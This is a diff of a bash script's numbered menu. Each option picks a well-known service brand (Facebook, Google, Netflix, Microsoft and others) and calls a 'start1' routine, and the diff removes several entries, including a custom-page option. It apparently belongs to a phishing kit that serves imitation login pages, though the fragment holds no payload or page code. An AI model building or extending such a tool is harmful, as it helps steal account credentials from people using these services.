@@ -62,72 +62,32 @@ elif [[ $option == 2 || $option == 02 ]]; then
 server="facebook"
 start1
 elif [[ $option == 3 || $option == 03 ]]; then
-server="snapchat"
+server="google"
 start1
 elif [[ $option == 4 || $option == 04 ]]; then
 server="twitter"
 start1
 elif [[ $option == 5 || $option == 05 ]]; then
-server="github"
-start1
-elif [[ $option == 6 || $option == 06 ]]; then
-server="google"
+server="youtube"
 start1
 
-elif [[ $option == 7 || $option == 07 ]]; then
+elif [[ $option == 6 || $option == 06 ]]; then
 server="spotify"
 start1
 
-elif [[ $option == 8 || $option == 08 ]]; then
+elif [[ $option == 7 || $option == 07 ]]; then
 server="netflix"
 start1
 
-elif [[ $option == 9 || $option == 09 ]]; then
-server="origin"
-start1
-
-elif [[ $option == 10 ]]; then
-server="steam"
-start1
-
-elif [[ $option == 11 ]]; then
-server="yahoo"
-start1
-
-elif [[ $option == 12 ]]; then
+elif [[ $option == 8 || $option == 08 ]]; then
 server="linkedin"
 start1
 
-elif [[ $option == 13 ]]; then
-server="protonmail"
-start1
-
-elif [[ $option == 14 ]]; then
-server="wordpress"
-start1
-
-elif [[ $option == 15 ]]; then
+elif [[ $option == 9 || $option == 09 ]]; then
 server="microsoft"
 start1
 
-elif [[ $option == 16 ]]; then
-server="instafollowers"
-start1
-
-elif [[ $option == 17 ]]; then
-server="gitlab"
-start1
-
-elif [[ $option == 18 ]]; then
-server="pinterest"
-start1
-
-elif [[ $option == 19 ]]; then
-server="create"
-createpage
-start1
-
-elif [[ $option == 99 ]]; then
+elif [[ $option == 0 ]]; then
 exit 1
 
 else
